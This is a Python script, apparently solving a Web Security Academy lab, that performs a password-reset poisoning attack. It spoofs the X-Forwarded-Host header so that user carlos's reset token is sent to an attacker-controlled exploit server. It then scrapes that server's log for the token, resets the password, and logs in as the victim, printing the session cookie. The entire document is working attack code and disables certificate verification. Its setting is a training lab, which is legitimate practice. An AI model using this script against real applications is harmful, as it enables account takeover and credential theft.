import requests
import re

#to disable ceritifcate warning
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

app_url = "https://0a2f00340470b1bf805608cd000c0047.web-security-academy.net/"     #application url
exp_ser_url = "exploit-0a7d00850497b1fa80fb071601a80067.exploit-server.net"   #exploit server url
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

headers = {'X-Forwarded-Host':exp_ser_url}
for_pass_data = {'username':'carlos'}

res_for= requests.post(app_url+"forgot-password",verify=False,proxies=proxies,data=for_pass_data,headers=headers) # to send password reset link to carlos


#-----------------------------------------------------code to find string in response------------------------------
res = requests.get("https://"+exp_ser_url+"/log",verify=False, proxies=proxies)

# Use regex to find all tokens
token_pattern = r"temp-forgot-password-token=([a-zA-Z0-9]+)"
tokens = re.findall(token_pattern, res.text)
print(tokens)

if tokens:
    last_token = tokens[-1]  # Get the last token in the list
    print(f"Last Extracted Token: {last_token}")
else:
    print("No tokens found in response.")
#------------------------------------------------------------------------------------------------------------------


#change carlos password to ron123
cha_data = {'temp-forgot-password-token':last_token,'new-password-1':'ron123','new-password-2':'ron123'}
cha_res = requests.post(app_url+"forgot-password?temp-forgot-password-token="+last_token,verify=False,proxies=proxies,data=cha_data)

print("password change to ron123, and now trying to login as carlos")

#login as carlos
session_carlos = requests.session()
login_data_carlos = {'username':'carlos','password':'ron123'}
car_login_res = session_carlos.post(app_url+"login", verify=False, proxies=proxies, data=login_data_carlos)
print("login as carlos successful, session cookie value is", session_carlos.cookies.get_dict())